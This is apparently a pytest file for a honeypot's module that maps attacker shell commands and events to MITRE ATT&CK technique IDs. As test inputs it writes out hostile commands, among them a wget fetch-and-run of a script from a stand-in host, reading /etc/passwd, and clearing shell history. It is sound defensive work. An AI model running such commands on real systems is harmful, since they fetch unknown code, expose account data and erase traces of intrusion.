from honeypot.events import Event, AUTH, COMMAND, HTTP_REQUEST
from honeypot.storage.db import Storage
from honeypot.analysis.mitre import map_command, map_event, summarize


def test_commands():
    assert map_command("uname -a") == {"T1082"}
    assert map_command("whoami") == {"T1033"}
    assert map_command("ls") == {"T1083"}
    assert map_command("cat /etc/passwd") == {"T1003.008"}
    assert map_command("history -c") == {"T1070.003"}
    assert map_command("hack") == set()


def test_download_and_run():
    cmd = "wget http://a.example/x.sh; chmod +x x.sh; ./x.sh"
    assert map_command(cmd) == {"T1105", "T1222.002", "T1059.004"}


def test_events():
    auth = {"event_type": AUTH, "payload": {"user": "root", "success": True}}
    assert map_event(auth) == {"T1110", "T1078"}
    web = {"event_type": HTTP_REQUEST, "payload": {"attacks": ["sqli", "scanner"]}}
    assert map_event(web) == {"T1190", "T1595"}


def test_summarize(tmp_path):
    db = Storage(tmp_path / "t.db")
    for _ in range(3):
        db.save(Event("ssh", AUTH, "1.1.1.1", session_id="a"))
    db.save(Event("ssh", COMMAND, "1.1.1.1", session_id="a", payload={"cmd": "uname -a"}))
    db.save(Event("ssh", AUTH, "2.2.2.2", session_id="b"))

    techs, tactics = summarize(db)
    assert techs["T1110"] == 2  # две сессии, а не четыре события
    assert techs["T1082"] == 1
    assert tactics["Discovery"] == 1